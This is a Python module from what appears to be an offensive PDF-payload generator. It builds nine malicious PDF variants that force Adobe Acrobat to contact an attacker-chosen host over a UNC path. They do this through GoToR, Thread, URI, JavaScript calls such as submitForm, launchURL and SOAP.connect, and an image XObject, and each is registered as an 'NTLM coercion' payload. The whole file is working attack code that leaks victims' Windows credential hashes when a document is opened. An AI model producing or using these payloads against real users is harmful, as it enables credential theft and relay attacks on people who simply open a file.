from __future__ import annotations

from nonpdf.core.branding import PDF_HEADER_COMMENT
from nonpdf.core.registry import PayloadEntry, registry


def _unc(host: str) -> str:
    return host.replace("https://", "").replace("http://", "").split("/")[0]


def _wrap(label: bytes, page_body: bytes) -> bytes:
    head = b"%PDF-1.7\n" + PDF_HEADER_COMMENT
    return (
        head
        + b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >>\nendobj\n"
        + b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 595 842] >>\nendobj\n"
        + b"3 0 obj\n<< /Type /Page /Parent 2 0 R /Resources << /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Courier >> >> >> /Contents 4 0 R >>\nendobj\n"
        + b"4 0 obj\n<< /Length 55 >>\nstream\nBT /F1 22 Tf 30 800 Td (" + label + b") Tj ET\nendstream\nendobj\n"
        + page_body
        + b"trailer\n<< /Root 1 0 R /Size 6 >>\n%%EOF\n"
    )


def _action(host: str, action_s: bytes, extra: bytes) -> bytes:
    return _wrap(
        b"unc",
        b"5 0 obj\n<< /Type /Action /S " + action_s + b" " + extra + b" >>\nendobj\n",
    )


def build_unc_gotor(host: str) -> bytes:
    u = _unc(host)
    return _action(
        host, b"/GoToR",
        b"/F << /Type /FileSpec /F (\\\\\\\\" + u.encode() + b"\\\\nonpdf-gotor.pdf) /V true >> /D [0 /Fit]",
    )


def build_unc_thread(host: str) -> bytes:
    u = _unc(host)
    return _action(
        host, b"/Thread",
        b"/F << /Type /FileSpec /F (\\\\\\\\" + u.encode() + b"\\\\nonpdf-thread.pdf) /V true >> /D 0",
    )


def build_unc_uri(host: str) -> bytes:
    u = _unc(host)
    return _action(
        host, b"/URI",
        b"/URI (\\\\\\\\" + u.encode() + b"\\\\nonpdf-uri)",
    )


def build_unc_submitform(host: str) -> bytes:
    u = _unc(host)
    return _action(
        host, b"/JavaScript",
        b"/JS (this.submitForm({cURL: \"\\\\\\\\\\\\\\\\" + u.encode() + b"\\\\\\\\nonpdf.fdf\"}))",
    )


def build_unc_geturl(host: str) -> bytes:
    u = _unc(host)
    return _action(
        host, b"/JavaScript",
        b"/JS (this.getURL(\"\\\\\\\\\\\\\\\\" + u.encode() + b"\\\\\\\\nonpdf.pdf\"))",
    )


def build_unc_launchurl(host: str) -> bytes:
    u = _unc(host)
    return _action(
        host, b"/JavaScript",
        b"/JS (app.launchURL(\"\\\\\\\\\\\\\\\\" + u.encode() + b"\\\\\\\\nonpdf.pdf\"))",
    )


def build_unc_soap(host: str) -> bytes:
    u = _unc(host)
    return _action(
        host, b"/JavaScript",
        b"/JS (SOAP.connect(\"\\\\\\\\\\\\\\\\" + u.encode() + b"\\\\\\\\nonpdf.pdf\"))",
    )


def build_unc_opendoc(host: str) -> bytes:
    u = _unc(host)
    return _action(
        host, b"/JavaScript",
        b"/JS (app.openDoc(\"\\\\\\\\\\\\\\\\" + u.encode() + b"\\\\\\\\nonpdf.pdf\"))",
    )


def build_unc_xobj(host: str) -> bytes:
    u = _unc(host)
    head = b"%PDF-1.7\n" + PDF_HEADER_COMMENT
    return (
        head
        + b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        + b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 595 842] >>\nendobj\n"
        + b"3 0 obj\n<< /Type /Page /Parent 2 0 R /Resources << /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Courier >> >> /XObject << /Im0 5 0 R >> >> /Contents 4 0 R >>\nendobj\n"
        + b"4 0 obj\n<< /Length 70 >>\nstream\nBT /F1 22 Tf 30 800 Td (unc-xobj) Tj ET\n/Im0 Do\nendstream\nendobj\n"
        + b"5 0 obj\n<< /Type /XObject /Subtype /Image /Width 1 /Height 1"
        + b" /BitsPerComponent 8 /ColorSpace /DeviceRGB"
        + b" /F (\\\\\\\\" + u.encode() + b"\\\\nonpdf.jpg) /Length 0 >>\nstream\n\nendstream\nendobj\n"
        + b"trailer\n<< /Root 1 0 R /Size 6 >>\n%%EOF\n"
    )


registry.register(PayloadEntry(
    id="U01", name="unc_gotor",
    builder=lambda host: build_unc_gotor(host),
    description="UNC /GoToR NTLM coercion",
    platform="acrobat", tags=("unc",),
))
registry.register(PayloadEntry(
    id="U02", name="unc_thread",
    builder=lambda host: build_unc_thread(host),
    description="UNC /Thread action NTLM coercion",
    platform="acrobat", tags=("unc",),
))
registry.register(PayloadEntry(
    id="U03", name="unc_uri",
    builder=lambda host: build_unc_uri(host),
    description="UNC /URI action",
    platform="acrobat", tags=("unc",),
))
registry.register(PayloadEntry(
    id="U04", name="unc_submitform",
    builder=lambda host: build_unc_submitform(host),
    description="UNC via this.submitForm()",
    platform="acrobat", tags=("unc",),
))
registry.register(PayloadEntry(
    id="U05", name="unc_geturl",
    builder=lambda host: build_unc_geturl(host),
    description="UNC via this.getURL()",
    platform="acrobat", tags=("unc",),
))
registry.register(PayloadEntry(
    id="U06", name="unc_launchurl",
    builder=lambda host: build_unc_launchurl(host),
    description="UNC via app.launchURL()",
    platform="acrobat", tags=("unc",),
))
registry.register(PayloadEntry(
    id="U07", name="unc_soap",
    builder=lambda host: build_unc_soap(host),
    description="UNC via SOAP.connect()",
    platform="acrobat", tags=("unc",),
))
registry.register(PayloadEntry(
    id="U08", name="unc_opendoc",
    builder=lambda host: build_unc_opendoc(host),
    description="UNC via app.openDoc()",
    platform="acrobat", tags=("unc",),
))
registry.register(PayloadEntry(
    id="U09", name="unc_xobj",
    builder=lambda host: build_unc_xobj(host),
    description="UNC image XObject NTLM coercion (no action)",
    platform="acrobat", tags=("unc",),
))
